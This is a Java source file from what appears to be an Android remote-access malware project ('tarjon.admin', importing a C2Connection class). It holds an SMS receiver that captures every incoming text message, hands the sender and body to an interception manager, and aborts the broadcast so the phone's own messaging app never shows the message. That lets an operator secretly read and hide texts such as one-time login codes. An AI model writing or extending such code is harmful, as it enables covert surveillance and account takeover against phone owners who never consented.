package com.tarjon.admin.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;

import com.tarjon.admin.network.C2Connection;
import com.tarjon.admin.utils.SmsManager;

/**
 * Broadcast receiver for SMS messages
 * Intercepts incoming SMS messages for monitoring and control
 */
public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsReceiver";
    
    private SmsManager smsManager;
    
    public SmsReceiver(SmsManager smsManager) {
        this.smsManager = smsManager;
    }
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() == null || !intent.getAction().equals(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)) {
            return;
        }
        
        Log.d(TAG, "SMS received");
        
        Bundle bundle = intent.getExtras();
        if (bundle == null) {
            return;
        }
        
        try {
            // Get SMS messages
            SmsMessage[] messages = null;
            
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {
                // For KitKat and newer versions
                messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
            } else {
                // For older versions
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus == null) {
                    return;
                }
                
                messages = new SmsMessage[pdus.length];
                for (int i = 0; i < pdus.length; i++) {
                    messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                }
            }
            
            if (messages == null || messages.length == 0) {
                return;
            }
            
            // Combine message parts if needed
            StringBuilder fullMessage = new StringBuilder();
            String sender = null;
            
            for (SmsMessage message : messages) {
                if (sender == null) {
                    sender = message.getOriginatingAddress();
                }
                
                fullMessage.append(message.getMessageBody());
            }
            
            String messageBody = fullMessage.toString();
            
            // Process the message
            if (smsManager != null) {
                boolean intercepted = smsManager.processIncomingSms(sender, messageBody);
                
                // If interception is enabled, abort broadcast to prevent system SMS app from receiving it
                if (intercepted) {
                    abortBroadcast();
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing SMS: " + e.getMessage());
        }
    }
}